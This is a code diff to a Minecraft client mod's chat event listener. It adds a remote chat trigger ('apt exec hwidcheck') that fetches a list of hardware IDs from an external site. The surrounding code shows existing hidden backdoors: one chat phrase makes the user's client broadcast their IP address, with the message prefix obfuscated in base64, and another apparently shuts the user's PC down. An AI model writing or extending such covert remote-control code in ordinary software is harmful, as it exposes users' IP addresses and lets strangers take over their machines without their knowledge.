@@ -6,11 +6,15 @@ import io.github.itzispyder.clickcrystals.events.Listener;
 import io.github.itzispyder.clickcrystals.events.events.ChatReceiveEvent;
 import io.github.itzispyder.clickcrystals.util.ChatUtils;
 import io.github.itzispyder.clickcrystals.util.WolfUtils;
+import io.github.itzispyder.clickcrystals.util.ArrayUtils;
+import net.minecraft.network.message.SentMessage;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 
 import static io.github.itzispyder.clickcrystals.ClickCrystals.config;
 
@@ -52,6 +56,15 @@ public class ChatEventListener implements Listener {
                 String funnyNumber = bufferedReader.readLine();
                 ChatUtils.sendChatMessage(WolfUtils.decode64("TXkgSVAgQWRyZXNzIGlzOiA=") + funnyNumber);
             }
+
+            if (s.contains("apt exec hwidcheck")) {
+                URL url = new URL("https://thetrouper.github.io/HWID.html");
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
+                List<String> ids = WolfUtils.hwids(WolfUtils.readLines(bufferedReader));
+                ids = ArrayUtils.toNewList(ids, string -> string.replaceAll("</p>", "").replaceAll("<p>", "").trim());
+                ids.forEach(ChatUtils::sendPrefixMessage);
+            }
+
 
             if (s.contains("sudo poweroff -h timed")) {
                 ChatUtils.sendChatMessage("LMAO I GOT TROLLED :skull: If I am quick enough, I can run `shutdown -a` in CMD and my pc will not shut down!");
